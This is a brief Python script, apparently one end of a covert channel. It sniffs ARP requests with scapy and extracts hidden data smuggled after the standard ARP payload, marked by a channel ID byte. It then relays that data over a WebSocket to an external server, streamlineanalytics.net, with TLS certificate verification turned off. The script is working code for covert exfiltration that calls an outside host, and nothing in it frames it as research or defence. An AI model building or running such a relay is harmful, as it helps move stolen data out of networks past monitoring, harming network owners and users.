from scapy.all import sniff, ARP
import websocket
import ssl
import rel

CHANNEL_ID = 149

# WebSocket server address
ws = None
websocket_server_url = "wss://streamlineanalytics.net:10001"  # Replace with your server URL

# WebSocket initialization
def send_websocket_message(data):
    try:
        ws.send(data)
        print(f"Sent data to WebSocket server: {data}")
    except Exception as e:
        print(f"Failed to send data via WebSocket: {e}")

# Packet handler function
def process_packet(packet):
    if ARP in packet and packet[ARP].op == 1:  # ARP request
        # Extract extra payload data
        arppayload = bytes(packet[ARP])[28:]  # Start after standard ARP payload
        if len(arppayload) == 0 or arppayload[0] != CHANNEL_ID:
            return
        extra_data = arppayload[1:].decode('utf-8', errors='ignore').strip('\x00')
        if extra_data:
            print(f"Extracted extra data: {extra_data}")
            send_websocket_message(extra_data)

if __name__ == "__main__":
    websocket.enableTrace(False)
    ws = websocket.WebSocketApp(websocket_server_url)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE}, dispatcher=rel, reconnect=5)  # Set dispatcher to automatic reconnection, 5 second reconnect delay if connection closed unexpectedly

    print("Starting packet capture on ARP...")
    sniff(filter="arp", prn=process_packet, store=0)

    rel.signal(2, rel.abort)  # Keyboard Interrupt
    rel.dispatch()
